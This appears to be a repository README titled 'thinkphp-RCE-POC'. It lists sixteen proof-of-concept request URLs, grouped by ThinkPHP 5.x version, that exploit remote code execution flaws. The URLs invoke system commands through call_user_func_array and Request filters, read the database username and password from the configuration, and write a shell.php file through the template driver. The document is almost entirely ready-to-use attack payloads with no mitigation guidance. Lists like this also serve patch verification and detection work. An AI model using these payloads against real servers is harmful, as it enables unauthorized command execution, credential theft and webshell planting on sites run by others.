# thinkphp-RCE-POC</br>
官方公告:https://blog.thinkphp.cn/869075</br>

POC：</br>
# thinkphp 5.0.22</br>
1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username</br>
2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password</br>
3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id</br>
4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1</br>
# thinkphp 5</br>
5、http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1</br>
# thinkphp 5.0.21</br>
6、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id</br>
7、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1</br>
# thinkphp 5.1.*</br>
8、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1</br>
9、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd</br>
10、http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E</br>
11、http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E</br>
12、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1</br>
13、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd</br>
14、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1</br>
15、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd</br>
16、http://url/to/index.php/module/action/param1/${@phpinfo()}
